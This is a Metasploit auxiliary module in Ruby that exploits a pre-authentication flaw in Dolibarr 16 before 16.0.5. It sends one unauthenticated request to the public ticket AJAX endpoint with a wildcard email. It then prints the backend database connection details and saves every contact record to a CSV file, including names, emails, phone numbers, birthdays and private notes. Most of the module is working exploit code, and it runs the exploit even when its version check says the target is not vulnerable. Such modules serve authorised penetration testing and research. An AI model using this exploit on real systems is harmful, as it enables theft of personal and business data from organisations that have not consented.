##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Dolibarr 16 pre-auth contact database dump',
        'Description' => %q{
          Dolibarr version 16 < 16.0.5 is vulnerable to a pre-authentication contact database dump.
          An unauthenticated attacker may retreive a company’s entire customer file, prospects, suppliers,
          and potentially employee information if a contact file exists.
          Both public and private notes are also included in the dump.
        },
        'Author' => [
          'Vladimir TOUTAIN', 'Nolan LOSSIGNOL-DRILLIEN'
        ],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2023-03-14',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'References' => [
          ['URL', 'https://www.dsecbypass.com/en/dolibarr-pre-auth-contact-database-dump/'],
          ['URL', 'https://github.com/Dolibarr/dolibarr/blob/16.0.5/ChangeLog#L34'],
          ['URL', 'https://github.com/Dolibarr/dolibarr/commit/bb7b69ef43673ed403436eac05e0bc31d5033ff7'],
          ['URL', 'https://github.com/Dolibarr/dolibarr/commit/be82f51f68d738cce205f4ce5b469ef42ed82d9e']
        ]
      )
    )
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'Path to Dolibarr instance', '/'])

      ]
    )
  end

  def check_host(_ip)
    res = send_request_cgi!({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path)
    })
    return Exploit::CheckCode::Unknown unless res && res.code == 200

    vprint_line('--Check Host--')
    vprint_good("Domain: #{vhost}")
    vprint_good("Target_URI: #{target_uri}")
    vprint_good("Response Code: #{res.code}")
    vprint_good("Response Body: #{res.body}")

    /(Dolibarr|Login @|version=)\s*-*\s*(?<version>\d+.*\.\d+)/ =~ res.body
    version = Rex::Version.new(version)
    if version.between?(Rex::Version.new('16.0.0'), Rex::Version.new('16.0.4'))
      return [Exploit::CheckCode::Appears, version]
    elsif version == '0'
      version = 'not found'
      return [Exploit::CheckCode::Detected, version]
    end

    return [Exploit::CheckCode::Safe, version]
  end

  def exploit
    res = send_request_cgi!({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'public', 'ticket', 'ajax', 'ajax.php?action=getContacts&email=%')
    }, timeout = 90, disconnect = true)
    vprint_line('--Exploit resquest--')
    vprint_line("Domain: #{vhost}")
    vprint_line("Target_URI: #{normalize_uri(target_uri.path, 'public', 'ticket', 'ajax', 'ajax.php?action=getContacts&email=%')}")

    vprint_line('--Exploit response--')
    begin
      res_json_document = res.get_json_document['contacts']
    rescue
      return Exploit::CheckCode::Unknown
    end

    if res && res.code != 200
      print_bad("Exploit response code: #{res.code}")
      return Exploit::CheckCode::Unknown
    elsif res_json_document.empty?
      print_bad('Dolibarr database empty')
      return Exploit::CheckCode::Unknown
    end

    vprint_good("Response Code: #{res.code}")
    vprint_good("Response Body: #{res.body}")

    begin
      print_good("Database type: #{res_json_document[0]['db']['type']}")
      print_good("Database name: #{res_json_document[0]['db']['database_name']}")
      print_good("Database user: #{res_json_document[0]['db']['database_user']}")
      print_good("Database host: #{res_json_document[0]['db']['database_host']}")
      print_good("Database port: #{res_json_document[0]['db']['database_port']}")
    end

    contact_entry = %w[
      id country country_code state state_code region region_code note_public note_private note name lastname
      firstname civility_id date_creation civility_code civility civilite address zip town poste email skype
      twitter facebook linkedin jabberid photo phone_perso phone_mobile fax birthday ref_facturation
      ref_contrat ref_commande user_login roles statut_commercial socname mail gender total_ht total_tva
      total_localtax1 total_localtax2 total_ttc fk_bank fk_delivery_address fk_account cond_reglement
      transport_mode_id barcode_type
    ]
    contact_entry_data = []

    nbr_contact = res_json_document.length.to_i

    print_good("Found #{nbr_contact} contacts.")

    path = store_loot(
      'dolibarr',
      'application/CSV',
      vhost,
      nil,
      '.csv'
    )

    csv_string = CSV.generate do |csv| # Loop to write into csv
      csv << contact_entry
      nbr_contact.times do |num| # Loop on every contact
        contact_entry.each_with_index do |element, index_element|
          begin
            contact_entry_data << res_json_document[num][element].to_s.gsub("\r\n", ' ')
          rescue
            contact_entry_data << ' '
          end
          if index_element == contact_entry.length - 1
            csv << contact_entry_data
            contact_entry_data.clear
          end
        end
      end
    end

    finalcsv = File.open(path.to_s, 'w+')
    finalcsv.puts(csv_string)
    finalcsv.close

    print_good("#{rhost}:#{rport} - File saved in: #{path}")
  end

  def run_host(_ip)
    check_code, version = check
    if check_code == Exploit::CheckCode::Safe || check_code == Exploit::CheckCode::Detected
      print_bad("Detected apparently non-vulnerable Dolibarr version: #{version}")
      vprint_status('Proceeding to exploit anyway')
      exploit
    elsif check_code == Exploit::CheckCode::Appears
      print_good("Detected vulnerable Dolibarr version: #{version}")
      exploit
    end
  end
end
